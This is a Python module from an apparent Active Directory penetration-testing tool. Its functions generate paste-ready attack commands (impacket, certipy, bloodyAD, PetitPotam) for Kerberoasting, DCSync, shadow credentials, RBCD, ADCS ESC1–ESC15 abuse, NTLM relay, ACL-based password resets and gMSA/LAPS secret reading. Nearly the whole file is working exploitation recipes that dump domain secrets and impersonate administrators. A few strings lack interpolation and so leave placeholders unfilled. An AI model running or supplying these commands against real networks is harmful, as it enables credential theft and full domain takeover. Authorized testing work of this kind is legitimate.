"""Per-finding exploitation recipe library.

Every function returns a `list[str]` — shell commands a pentester can paste,
one per line, with `#`-prefixed comments for context. Values are interpolated
from what ADEX collected during enum so the recipes are runnable as-is.

The point: when ADEX finds something, you don't have to look up the impacket
flag syntax — just copy the block under "Recipe" in the report.
"""

from __future__ import annotations


def _attacker_creds_flag(domain: str, username: str | None,
                        password: str | None, nt_hash: str | None) -> str:
    """Build the credential portion of an impacket-style command line."""
    if not username:
        return f"{domain}/anonymous"
    if password:
        return f"{domain}/{username}:'{password}'"
    if nt_hash:
        return f"-hashes {nt_hash} {domain}/{username}"
    return f"{domain}/{username}"


# ---------------------------------------------------------------------------
# Roasting
# ---------------------------------------------------------------------------

def kerberoast(domain: str, dc: str, target_user: str | None = None,
               username: str | None = None, password: str | None = None,
               nt_hash: str | None = None) -> list[str]:
    creds = _attacker_creds_flag(domain, username, password, nt_hash)
    user_arg = f" -request-user {target_user}" if target_user else " -request"
    return [
        "# Request the TGS for the SPN'd user and dump it as a hashcat-ready hash",
        f"impacket-GetUserSPNs {creds} -dc-ip {dc}{user_arg} "
        f"-outputfile kerberoast.hash",
        "# Crack offline (hashcat mode 13100 = Kerberos 5 TGS-REP etype 23)",
        "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt",
    ]


def asrep_roast(domain: str, dc: str, target_user: str,
                username: str | None = None) -> list[str]:
    return [
        "# Pre-auth is disabled — request the AS-REP and dump as hashcat hash",
        f"impacket-GetNPUsers {domain}/{target_user} -no-pass -dc-ip {dc} "
        f"-format hashcat -outputfile asrep.hash",
        "# Crack offline (hashcat mode 18200 = Kerberos 5 AS-REP etype 23)",
        "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
    ]


# ---------------------------------------------------------------------------
# Replication / DCSync
# ---------------------------------------------------------------------------

def dcsync(domain: str, dc: str, username: str, password: str | None = None,
           nt_hash: str | None = None, target_user: str = "krbtgt") -> list[str]:
    creds = _attacker_creds_flag(domain, username, password, nt_hash)
    return [
        "# DCSync — replicate secrets from the DC. Defaults to dumping all NTDS.",
        f"impacket-secretsdump {creds} -dc-ip {dc} -just-dc",
        "# Or only the krbtgt hash (golden ticket prep):",
        f"impacket-secretsdump {creds} -dc-ip {dc} -just-dc-user {target_user}",
    ]


# ---------------------------------------------------------------------------
# Shadow Credentials
# ---------------------------------------------------------------------------

def shadow_creds(domain: str, dc: str, target: str, username: str,
                 password: str | None = None, nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        "# Add a Key Credential to the target, then PKINIT as them — one shot:",
        f"certipy shadow auto -u {username}@{domain} {pwd_or_hash} "
        f"-account {target} -dc-ip {dc}",
        "# Then use the resulting .ccache:",
        f"export KRB5CCNAME=$PWD/{target}.ccache",
        f"impacket-secretsdump -k -no-pass {domain}/{target}@{dc}",
    ]


# ---------------------------------------------------------------------------
# RBCD
# ---------------------------------------------------------------------------

def rbcd_write(domain: str, dc: str, target: str, controlled_computer: str,
               username: str, password: str | None = None,
               nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    creds_flat = (f":'{password}'" if password
                  else (f":{nt_hash.split(':')[-1] if nt_hash else ''}"))
    return [
        "# 1. Add a controlled computer (needs MAQ > 0) — skip if you already have one:",
        f"impacket-addcomputer -computer-name '{controlled_computer}' "
        f"-computer-pass 'Pwn3d!' {domain}/{username}{creds_flat} -dc-ip {dc}",
        "# 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target:",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"add rbcd '{target}' '{controlled_computer}'",
        "# 3. Request a TGS as any user (e.g. Administrator) via S4U:",
        f"impacket-getST -spn cifs/{target}.{domain} "
        f"-impersonate Administrator -dc-ip {dc} "
        f"{domain}/{controlled_computer.rstrip('$')}\\$:'Pwn3d!'",
        "# 4. Use the ticket:",
        f"export KRB5CCNAME=Administrator.ccache && "
        f"impacket-secretsdump -k -no-pass {target}.{domain}",
    ]


# ---------------------------------------------------------------------------
# ADCS
# ---------------------------------------------------------------------------

def esc1(ca: str, template: str, target_upn: str, domain: str, dc: str,
         username: str, password: str | None = None,
         nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC1: enroll a cert as {target_upn} via vulnerable template '{template}':",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{template}' -upn '{target_upn}'",
        "# Authenticate with the cert (PKINIT) → TGT for the impersonated user:",
        f"certipy auth -pfx {target_upn.split('@')[0]}.pfx -dc-ip {dc}",
        "# Then dump secrets:",
        f"impacket-secretsdump -k -no-pass {target_upn}@{dc}",
    ]


def esc2_subca(ca: str, template: str, domain: str, dc: str, username: str,
               password: str | None = None, nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC2: template '{template}' has Any-Purpose / SubCA EKU.",
        "# Issued cert can be used as a sub-CA → forge any client-auth cert.",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{template}'",
        "# Use the cert to forge an arbitrary user cert (certipy forge):",
        "certipy forge -ca-pfx <issued>.pfx -upn administrator@{domain} "
        f"-subject 'CN=Administrator,CN=Users,DC={domain.replace('.', ',DC=')}'",
    ]


def esc3_enrollment_agent(ca: str, agent_template: str, victim_template: str,
                          target_upn: str, domain: str, dc: str, username: str,
                          password: str | None = None,
                          nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC3: enrol an Enrollment Agent cert via '{agent_template}',",
        f"# then on-behalf-of-enrol '{victim_template}' as {target_upn}.",
        "# 1. Get the agent cert:",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{agent_template}'",
        "# 2. Use it to enrol another template on behalf of a privileged user:",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{victim_template}' "
        f"-on-behalf-of '{domain}\\administrator' -pfx {username}.pfx",
        f"certipy auth -pfx {target_upn.split('@')[0]}.pfx -dc-ip {dc}",
    ]


def esc4_template_acl(template: str, attacker_sid: str, domain: str, dc: str,
                      username: str, password: str | None = None,
                      nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC4: principal can write the template object '{template}'.",
        "# Make it ESC1-vulnerable, then enrol:",
        f"certipy template -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-template '{template}' -save-old",
        "# Now enrol as administrator:",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-template '{template}' -upn administrator@{domain}",
        "# When done, restore the original template config:",
        f"certipy template -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-template '{template}' -configuration {template}.json",
    ]


def esc5_pki_object(target_dn: str, domain: str, dc: str, username: str,
                    password: str | None = None,
                    nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC5: dangerous write right on PKI infrastructure object {target_dn}.",
        "# Path depends on which object — you can:",
        "# - Modify NTAuthCertificates to insert your own root → forge anything",
        "# - Modify a CA object to alter its policy / templates list",
        "# - Modify Certificate Templates container to add a vulnerable template",
        "# Generic LDAP write via bloodyAD:",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"set object '{target_dn}' <attribute> <value>",
        "# Or use certipy's container-edit subcommands as appropriate.",
    ]


def esc6_editflags(ca: str, domain: str, dc: str, username: str,
                   password: str | None = None,
                   nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC6: CA '{ca}' has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled.",
        "# Enrol any template that grants client-auth EKU and supply a SAN:",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template User -upn administrator@{domain}",
        f"certipy auth -pfx administrator.pfx -dc-ip {dc}",
    ]


def esc7_manage_ca(ca: str, domain: str, dc: str, username: str,
                   password: str | None = None,
                   nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC7: principal has ManageCA / ManageCertificates on '{ca}'.",
        "# 1. Grant your account 'Officer' role and approve a pending request:",
        f"certipy ca -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -add-officer {username}",
        "# 2. Submit a request for a denied/restricted template, then approve:",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template 'SubCA' && \\",
        f"certipy ca -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -issue-request <request-id>",
    ]


def esc8_relay(ca_web_endpoint: str, target_dc: str, attacker_iface: str = "tun0") -> list[str]:
    return [
        "# ESC8: relay machine NTLM auth to AD CS HTTP enrollment endpoint.",
        "# 1. Start ntlmrelayx targeting the CA's web enroll URL:",
        f"impacket-ntlmrelayx -t {ca_web_endpoint}/certsrv/certfnsh.asp "
        f"--adcs --template DomainController -smb2support",
        "# 2. Coerce the target DC's machine account to authenticate to your host:",
        f"PetitPotam.py -u '' -p '' $(ip -4 addr show {attacker_iface} | "
        f"awk '/inet /{{print $2}}' | cut -d/ -f1) {target_dc}",
        "# 3. ntlmrelayx receives the cert; use it via certipy auth to get a TGT:",
        f"certipy auth -pfx {target_dc.split('.')[0]}\\$.pfx -dc-ip {target_dc}",
    ]


def esc9_no_security_extension(ca: str, template: str, target_upn: str,
                               domain: str, dc: str, username: str,
                               password: str | None = None,
                               nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC9: template '{template}' has CT_FLAG_NO_SECURITY_EXTENSION (0x80000).",
        "# StrongCertificateBindingEnforcement is bypassed — UPN-based auth maps",
        "# to whatever account name you put in the certificate.",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{template}' -upn '{target_upn}'",
        f"certipy auth -pfx {target_upn.split('@')[0]}.pfx -dc-ip {dc} "
        "-domain {domain}",
    ]


def esc11_icpr_relay(ca_host: str, target_dc: str,
                     attacker_iface: str = "tun0") -> list[str]:
    return [
        f"# ESC11: relay NTLM auth to {ca_host} via ICPR (RPC) interface.",
        "# Same outcome as ESC8 but via \\pipe\\cert (RPC) instead of HTTP /certsrv/.",
        "# 1. Start ntlmrelayx with the ICPR target:",
        f"impacket-ntlmrelayx -t rpc://{ca_host} -rpc-mode ICPR --adcs "
        "--template DomainController -smb2support",
        "# 2. Coerce a machine account to authenticate to your host:",
        f"PetitPotam.py -u '' -p '' $(ip -4 addr show {attacker_iface} | "
        f"awk '/inet /{{print $2}}' | cut -d/ -f1) {target_dc}",
        f"certipy auth -pfx {target_dc.split('.')[0]}\\$.pfx -dc-ip {target_dc}",
    ]


def esc13_oid_group(ca: str, template: str, linked_group: str, domain: str,
                    dc: str, username: str, password: str | None = None,
                    nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC13: template '{template}' has issuance policy linked to group "
        f"'{linked_group}'.",
        "# Cert holders inherit the group's privileges via Kerberos PAC.",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{template}'",
        f"certipy auth -pfx {username}.pfx -dc-ip {dc}",
        f"# The TGT now contains '{linked_group}' membership.",
    ]


def esc15_ekuwu(ca: str, template: str, target_upn: str, domain: str, dc: str,
                username: str, password: str | None = None,
                nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# ESC15 (EKUwu): schema-v1 template '{template}' lets you supply the",
        "# Application Policies extension at request time, overriding the EKU.",
        f"certipy req -u {username}@{domain} {pwd_or_hash} -dc-ip {dc} "
        f"-ca '{ca}' -template '{template}' -upn '{target_upn}' "
        "-application-policies '1.3.6.1.5.5.7.3.2'",
        f"certipy auth -pfx {target_upn.split('@')[0]}.pfx -dc-ip {dc}",
    ]


# ---------------------------------------------------------------------------
# Generic ACL abuse
# ---------------------------------------------------------------------------

def genericwrite_password_reset(target_dn: str, target_sam: str,
                                domain: str, dc: str, username: str,
                                password: str | None = None,
                                nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# GenericWrite/GenericAll on {target_sam} → reset the user's password:",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"set password '{target_sam}' 'Pwn3d!Pwn3d!'",
        "# Or set a Shadow Credential (no password reset, stealthier):",
        f"certipy shadow auto -u {username}@{domain} {pwd_or_hash} "
        f"-account {target_sam} -dc-ip {dc}",
    ]


def add_member(target_group_sam: str, member_sam: str, domain: str, dc: str,
               username: str, password: str | None = None,
               nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# Add yourself (or a controlled principal) to '{target_group_sam}':",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"add groupMember '{target_group_sam}' '{member_sam}'",
    ]


def writedacl_grant_self(target_dn: str, attacker_sid: str,
                         domain: str, dc: str, username: str,
                         password: str | None = None,
                         nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        "# WriteDACL on the target → grant yourself GenericAll on it:",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"add genericAll '{target_dn}' '{attacker_sid}'",
        "# Then exploit the new GenericAll (e.g. password reset or Shadow Creds).",
    ]


# ---------------------------------------------------------------------------
# Delegation
# ---------------------------------------------------------------------------

def unconstrained_coerce(target_computer: str, domain: str, dc: str,
                         attacker_listener: str) -> list[str]:
    return [
        f"# {target_computer} has unconstrained delegation. Coerce a privileged "
        "machine account to authenticate to it; the TGT for that machine then "
        f"sits cached on {target_computer} and you can reuse it.",
        "# 1. Have admin/system on the unconstrained host (it's the prerequisite).",
        "# 2. From there, run rubeus monitor or similar to grab incoming TGTs:",
        "Rubeus.exe monitor /interval:5 /nowrap",
        "# 3. From your kali, coerce a target DC to auth to the unconstrained host:",
        f"printerbug.py {domain}/<user>:<password>@<targetDC> {target_computer}",
        "# Or PetitPotam (no creds needed pre-patch):",
        f"PetitPotam.py {target_computer} <targetDC>",
        "# 4. Extract & reuse the captured TGT from the unconstrained host's memory.",
    ]


def constrained_s4u(controlled_account: str, target_spn: str,
                    impersonate_user: str, domain: str, dc: str,
                    nt_hash: str | None = None) -> list[str]:
    hash_arg = f"-hashes {nt_hash}" if nt_hash else "-no-pass"
    return [
        f"# {controlled_account} is allowed to delegate to {target_spn}.",
        "# Use S4U2Self+S4U2Proxy to obtain a TGS as any user for that SPN:",
        f"impacket-getST {hash_arg} -spn {target_spn} "
        f"-impersonate {impersonate_user} -dc-ip {dc} {domain}/{controlled_account}",
    ]


# ---------------------------------------------------------------------------
# gMSA / LAPS
# ---------------------------------------------------------------------------

def gmsa_read(target_gmsa: str, domain: str, dc: str, username: str,
              password: str | None = None, nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# Read the gMSA password (NT hash) for {target_gmsa}:",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"get object '{target_gmsa}$' --attr msDS-ManagedPassword",
        "# Or:",
        f"gMSADumper.py -u {username} -p '{password or ''}' -d {domain}",
    ]


def laps_read(target_computer: str, domain: str, dc: str, username: str,
              password: str | None = None, nt_hash: str | None = None) -> list[str]:
    pwd_or_hash = (f"-p '{password}'" if password
                   else (f"-hashes {nt_hash}" if nt_hash else ""))
    return [
        f"# Read the LAPS-managed local admin password for {target_computer}:",
        f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
        f"get object '{target_computer}$' --attr ms-Mcs-AdmPwd,msLAPS-Password",
    ]
